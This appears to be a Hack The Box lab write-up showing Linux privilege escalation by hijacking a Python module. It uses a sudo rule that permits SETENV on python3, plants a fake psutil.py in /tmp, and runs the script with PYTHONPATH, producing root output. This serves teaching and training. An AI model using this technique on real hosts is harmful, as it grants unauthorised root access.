# PYTHONPATH

## Sudoers

```sh
htb-student@ubuntu:~$ sudo -l
```

```output title="Output" hl_lines="5"
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

## SUID Script

```sh
htb-student@ubuntu:~$ ls -l mem_status.py
```

```output title="Output"
-rwsrwxr-x 1 root mrb3n 192 May 19  2023 mem_status.py
```

## Contents

```sh
htb-student@ubuntu:~$ cat mem_status.py
```

```python title="Output" hl_lines="4"
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

## Custom Module

```python title="/tmp/psutil.py" linenums="1"
import os

def virtual_memory():
    os.system("whoami")
```

## Exploiting

```sh
htb-student@ubuntu:~$ sudo PYTHONPATH=/tmp /usr/bin/python3 /home/htb-student/mem_status.py
```

```output title="Output" hl_lines="1"
root
Traceback (most recent call last):
  File "/home/htb-student/mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```
